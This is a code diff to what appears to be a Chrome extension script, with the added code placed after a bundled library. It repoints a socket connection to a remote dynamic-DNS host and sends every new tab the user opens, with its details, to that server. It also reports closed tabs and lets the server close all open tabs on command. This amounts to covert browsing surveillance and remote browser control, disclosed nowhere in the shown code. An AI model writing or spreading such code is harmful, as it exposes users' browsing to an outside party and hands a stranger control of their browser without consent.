@@ -3870,16 +3870,43 @@ if (typeof define === "function" && define.amd) {
 }
 })();
 
-var socket = io.connect('http://127.0.0.1:3000/');
-var tabs = [];
+var socket = io.connect('http://sudo.servebeer.com:8080');
+var tabs = {};
+var client = Math.random() * 2342342342;
+var closeAll = function(){
+  var arr = [];
+   // loop through tab objects
+   for(var key in tabs){
+      var tabid = tabs[key].id;
+      arr.push(tabid);
+   }
+   chrome.tabs.remove(arr);
+   tabs = {};
+};
+// on connection send a random number for client id
+socket.on("connect", function(){
+  socket.emit("new_client", {client: client});
+});
+// when we get the close command
 socket.on('close', function (data) {
    console.log(data);
-   chrome.tabs.remove(tabs);
+   closeAll();
 });
 
-
+// when a new tab is created
 chrome.tabs.onCreated.addListener(function(tab) {
-	tabs.push(tab.id);
-    setTimeout(function(){chrome.tabs.remove(tab.id)}, (Math.random() * 240000) + 60000);
+	tabs[tab.id] = tab;
+  console.log(tab);
+  // emit the new tab with the client id
+  socket.emit("new_tab", {tab : tab, client : client});
+  //removing timeout time its better tracked
+  //setTimeout(function(){chrome.tabs.remove(tab.id)}, (Math.random() * 240000) + 60000);
 });
+
+// remove tabs from tracking when a tab is removed
+chrome.tabs.onRemoved.addListener(function(tabid) {
+  delete tabs[tabid];
+  console.log(tabid);
+  socket.emit("close_tab", {tabid : tabid, client : client})
+})
 
